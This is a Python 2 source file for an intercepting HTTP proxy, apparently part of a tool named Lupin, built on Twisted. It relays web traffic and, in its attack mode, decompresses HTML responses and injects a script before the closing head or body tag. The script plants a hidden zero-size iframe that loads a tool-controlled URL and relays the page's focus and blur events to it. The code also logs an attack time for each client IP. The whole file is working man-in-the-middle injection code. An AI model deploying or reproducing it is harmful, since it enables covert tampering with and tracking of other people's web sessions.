import re, string, random, zlib, gzip, StringIO, os, time
from twisted.web.http import HTTPClient
from Lupin.PersistentData import PersistentData

class ServerConnection(HTTPClient):

    def __init__(self, command, uri, postData, actAs, headers, client):
        self.command          = command
        self.uri              = uri
        self.postData         = postData
        self.headers          = headers
        self.client           = client
        self.PersistentData   = PersistentData.getInstance()
        self.isCompressed     = False
        self.contentLength    = None
        self.shutdownComplete = False
        self.actAs            = actAs

		
    def getPostPrefix(self):
        return "POST"

    def sendRequest(self):
        self.sendCommand(self.command, self.uri)

    def sendHeaders(self):
        for header, value in self.headers.items():
            self.sendHeader(header, value)           
        self.endHeaders()

    def sendPostData(self):
        self.transport.write(self.postData)

    def connectionMade(self):
        self.sendRequest()
        self.sendHeaders()
        
        if (self.command == 'POST'):
            self.sendPostData()

    def handleStatus(self, version, status, message): 
	if status != "200":
		self.actAs = self.PersistentData._PROXY
        self.client.setResponseCode(int(status), message)


    def handleHeader(self, key, value):     
        if (key.lower() == 'content-type'):
            if "text/html" not in value:
                self.actAs = self.PersistentData._PROXY              
        elif (key.lower() == 'content-length'):
            self.contentLength = value

	if (key.lower() == 'content-encoding') and ("gzip" not in value):
		print "encoding: "+value
	
	if (key.lower() == 'content-encoding') and ("gzip" in value) and (self.actAs == self.PersistentData._LUPIN):
                self.isCompressed = True  
        else:
            self.client.setHeader(key, value)



    def handleEndHeaders(self):       
       if self.contentLength != None:
          self.client.setHeader("Content-Length", self.contentLength)
       
       if self.length == 0:
           self.shutdown()
                        
    def handleResponsePart(self, data):        
        if self.actAs == self.PersistentData._PROXY:
            self.client.write(data)
        else:
            HTTPClient.handleResponsePart(self, data)


    def handleResponseEnd(self):      
        if self.actAs == self.PersistentData._PROXY:
            self.shutdown()
        else:
            HTTPClient.handleResponseEnd(self)
                      


    def handleResponse(self, data):

        if self.actAs == self.PersistentData._LUPIN:
            if (self.isCompressed):
                data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()

            injectPoint = self.findInjectPoint(data);
            if injectPoint != -1:    
                #print "FRAMING: "+self.client.getHeader("host")
                data = self.injectSetupScript(data, injectPoint)
	 
        
        if (self.contentLength != None):
            self.client.setHeader('Content-Length', len(data))     

        self.client.write(data)
        self.shutdown()
  

    def findInjectPoint(self,data):
        headEnd = data.find("</head>")
        if headEnd == -1:
             bodyEnd = data.find("</body>")
             if bodyEnd == -1:
                return -1
             else:       
                return bodyEnd
        else: 
             return headEnd    

    def injectSetupScript(self,data, injectPoint):    
        newData = data[:injectPoint]
        rest = data[injectPoint:]
        setupScript = "function selfDestruct(){ \
                            master = document.getElementById('masterIframe'); \
                            master.parentNode.removeChild(master); \
                        }\
                        function onMessage(event){ \
                            m = event.data;\
                            if('selfDestruct' == m) selfDestruct();\
                        }\
                        function onFocus(){\
	                        n = window.frames.length;\
	                        window.frames[n-1].postMessage('focus','*');\
                        }\
                        function onBlur(){\
                            n = window.frames.length;\
                            window.frames[n-1].postMessage('blur','*');\
                        }\
                        function initFraming(){\
                            window.addEventListener('message', onMessage, false); \
                            window.addEventListener ('blur', onBlur, false);\
                            window.addEventListener ('focus', onFocus, false);\
                            masterIframe = document.createElement('IFRAME'); \
                            masterIframe.setAttribute('src', _LUPIN_FRAME_TOKEN);\
                            masterIframe.setAttribute('id', 'masterIframe');\
                            masterIframe.setAttribute('name', 'masterIframe');\
                            masterIframe.setAttribute('style', 'visibility:hidden;display:none');\
                            masterIframe.setAttribute('height', '0');\
                            masterIframe.setAttribute('width', '0');\
                            document.body.appendChild(masterIframe);\
                        }\
                        setTimeout('initFraming()',1000);"
                        
        newData += "<script type=\"text/javascript\"> _LUPIN_FRAME_TOKEN=\"" + self.PersistentData._LUPIN_TOKEN + self.PersistentData._FRAME + "\";"+setupScript+"</script>" + rest
        self.client.PersistentData.setLastAttackTime(self.client.getClientIP())	
        return newData
         
    def shutdown(self):
        if not self.shutdownComplete:
            self.shutdownComplete = True
            try:  
               self.client.finish()        
            except RuntimeError:
               pass
            self.transport.loseConnection() 

